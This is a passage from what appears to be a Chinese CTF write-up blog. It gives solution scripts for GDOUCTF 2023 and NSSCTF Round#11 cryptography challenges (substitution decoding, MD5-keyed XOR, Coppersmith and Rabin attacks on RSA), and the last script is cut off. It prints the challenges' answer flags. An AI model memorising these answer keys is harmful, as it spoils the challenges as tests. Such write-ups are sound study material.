class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;^&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            hasInvalidCharacter = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasInvalidCharacter) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The decrypted string contains invalid characters.&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encryptedString)</span><br><span class="line">&#125;</span><br><span class="line">#flag&#123;c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r!thm_written_in_vanil1a_js&#125;</span><br></pre></td></tr></table></figure>





<h2 id="babylua"><a href="#babylua" class="headerlink" title="babylua"></a>babylua</h2><p>交给chatgpt了，看不懂lua</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        seed = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters, k=<span class="number">4</span>))</span><br><span class="line">        md5_hash = hashlib.md5()</span><br><span class="line">        md5_hash.update(hashlib.md5(seed.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest().encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = md5_hash.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> key[:<span class="number">10</span>] == <span class="string">&quot;b5e62abe84&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = recover_key()</span></span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">key = <span class="string">&#x27;b5e62abe84bc8afbfd97c91a15aa0867&#x27;</span></span><br><span class="line">encrypted = [<span class="number">200</span>, <span class="number">161</span>, <span class="number">198</span>, <span class="number">157</span>, <span class="number">173</span>, <span class="number">169</span>, <span class="number">199</span>, <span class="number">150</span>, <span class="number">105</span>, <span class="number">163</span>, <span class="number">193</span>, <span class="number">175</span>, <span class="number">173</span>, <span class="number">194</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">135</span>, <span class="number">225</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">encrypted, key</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted):</span><br><span class="line">        flag += <span class="built_in">chr</span>(v - <span class="built_in">ord</span>(key[i % <span class="number">32</span>]))</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(encrypted, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;He11o_Lua!!!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Magic-of-Encoding"><a href="#Magic-of-Encoding" class="headerlink" title="Magic of Encoding"></a>Magic of Encoding</h2><p>依次删除里面的干扰flag，，，，，建议下次仍杂项</p>
<p>得到一个压缩包</p>
<p><img src="/2023/04/16/2023-GDOUCTF/55503bdb8d8f6005db3dce12baebdb0.png" alt="55503bdb8d8f6005db3dce12baebdb0"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h0p3_y0u_lik3d_the_M4gic_7rick&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Math-Problem"><a href="#Math-Problem" class="headerlink" title="Math Problem"></a>Math Problem</h2><p>coppersmith解出x，再f和n求gcd即是p</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">a = <span class="number">9303981927028382051386918702900550228062240363697933771286553052631411452412621158116514735706670764224584958899184294505751247393129887316131576567242619</span></span><br><span class="line">b = <span class="number">9007779281398842447745292673398186664639261529076471011805234554666556577498532370235883716552696783469143334088312327338274844469338982242193952226631913</span></span><br><span class="line">y = <span class="number">970090448249525757357772770885678889252473675418473052487452323704761315577270362842929142427322075233537587085124672615901229826477368779145818623466854</span></span><br><span class="line">n = <span class="number">79239019133008902130006198964639844798771408211660544649405418249108104979283858140199725213927656792578582828912684320882248828512464244641351915288069266378046829511827542801945752252863425605946379775869602719406340271702260307900825314967696531175183205977973427572862807386846990514994510850414958255877</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x**<span class="number">3</span> + a*x +b - y**<span class="number">2</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">64</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="built_in">print</span>(x0)</span><br><span class="line"></span><br><span class="line">x0=<span class="number">9757458594430450711</span></span><br><span class="line">f = x0**<span class="number">3</span> + a*x0 +b - y**<span class="number">2</span></span><br><span class="line">p = GCD(f,n)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">45457869965165575324534408050513326739799864850578881475341543330291990558135968254698676312246850389922318827771380881195754151389802803398367341521544667542828862543407738361578535730524976113729406101764290984943061582342991118766322793847422471903811686775249409300301726906738475446634950949059180072008</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="comment">#print(n//p)</span></span><br><span class="line">d= inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[9757458594430450711]</span><br><span class="line">b&#x27;flag&#123;c4edd6d0-d1b3-cbda-95e3-a323edc35be5&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>关注公众号，回复签到得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CHAITIN_x_GDOUCTF2023&#125;</span><br><span class="line">签到成功 </span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023GDOUCTF/" rel="tag">2023GDOUCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-NSSCTF-Round-11"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/04/09/NSSCTF-Round-11/"
    >NSSCTF Round#11</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/04/09/NSSCTF-Round-11/" class="article-date">
  <time datetime="2023-04-09T10:43:08.000Z" itemprop="datePublished">2023-04-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>本次round好多交互，这种类型得脚本写的比较少，参考了一些大佬的脚本</p>
<h1 id="ez-enc"><a href="#ez-enc" class="headerlink" title="ez_enc"></a>ez_enc</h1><p>ABAABBBAABABAABBABABAABBABAAAABBABABABAAABAAABBAABBBBABBABBABBABABABAABBAABBABAAABBAABBBABABABAAAABBAAABABAABABBABBBABBAAABBBAABABAABBAAAABBBAAAABAABBBAABBABABAABABAAAAABBBBABAABBBBAAAABBBBBAB</p>
<p>提示不是培根密码</p>
<p>直接ciphey一把梭</p>
<p><img src="/2023/04/09/NSSCTF-Round-11/image-20230408104303610.png" alt="image-20230408104303610"></p>
<p>NSSCTF{mS4gT1Kv9L8NjPzx}</p>
<p>或者B–&gt;1,A–&gt;0，然后转文本</p>
<h1 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> p &gt; q</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65536</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">num1 = (<span class="built_in">pow</span>(p,e,n)-<span class="built_in">pow</span>(q,e,n)) % n</span><br><span class="line">num2 = <span class="built_in">pow</span>(p-q,e,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;num1=&quot;</span>,num1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;num2=&quot;</span>,num2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>分析：</p>
<p>$num1  \equiv p^e  -  q^e mod n$</p>
<p>$num2  \equiv  (p-q)^e \equiv  p^e + q^e   mod  n$</p>
<p>$num1 + num2  \equiv 2p^e   mod  n$</p>
<p>将上式与n求gcd即可分解n<br>特殊的地方在e&#x3D;65536，观察可以得到这里p q都是4k+3型素数，想到是rabin的变式，进行16次rabin算法即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">num1= <span class="number">24878810498817248549601963074742685387386464942462157441627831559105735510922831745148498491917305807763652117589000468102621763100124920892363322194429534963670648950723660355117500201845429921299091570150674940239532169196783311708023321903390056373346462408338127956230246368885082072149299468189613330701</span></span><br><span class="line">num2= <span class="number">56042767418908338314258886089384708269108770192686490541655734563698206477690563665417949934725233235902569236157929677765439019670917433092766376185064198413489357059092974054470881454103094970536553398696049799479326484291184241512583550559743820850066081694272753995204856617490081525492534694894128803854</span></span><br><span class="line">n= <span class="number">82787523645374032053495210843370017123931172377557271655638312997792541298388666815392709656552641860759854061080381255745530793945458793925964239003822125725989147047931146084256499955384247979600706446509819528773207269723034851995962510261418309720723966938718829746368418522291444193759059939732595711529</span></span><br><span class="line">c= <span class="number">34003458028770944852041095267110206438297243701089262869163250699264377890408968607261710243439051430361829201875786192841340344437449619791066464678110573083728216440444967701968867091815499710925753219016250452889993999986949308467638206737284082995045112478010799884241546145302576780928007895589838096434</span></span><br><span class="line">e=<span class="number">65536</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = GCD(num1+num2,n)</span><br><span class="line">q = n//p</span><br><span class="line">x0=gmpy2.invert(p,q)</span><br><span class="line">x1=gmpy2.invert(q,p)</span><br><span class="line">cs = [c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> c2 <span class="keyword">in</span> cs:</span><br><span class="line">        r = <span class="built_in">pow</span>(c2, (p + <span class="number">1</span>) // <span 